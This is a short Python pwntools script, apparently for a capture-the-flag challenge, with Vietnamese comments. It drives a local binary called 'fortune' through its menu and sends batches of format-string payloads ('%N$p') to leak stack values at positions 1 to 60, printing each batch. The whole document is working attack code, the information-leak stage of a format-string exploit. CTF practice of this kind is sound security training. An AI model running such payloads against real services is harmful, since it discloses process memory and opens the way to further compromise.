from pwn import *

p = process("./fortune")

# Đọc menu đầu tiên, bao gồm prompt "> "
p.recvuntil(b"> ")

for start in [1, 21, 41]:
    end = start + 20

    payload = b"|".join(
        f"%{i}$p".encode() for i in range(start, end)
    )

    # Đã đọc prompt rồi nên gửi trực tiếp
    p.sendline(b"1")
    p.recvuntil(b"> ")       # prompt của oracle
    p.sendline(payload)

    result = p.recvuntil(b"> ", timeout=2)
    print(f"\n--- positions {start}-{end - 1} ---")
    print(result.decode(errors="replace"))

p.close()
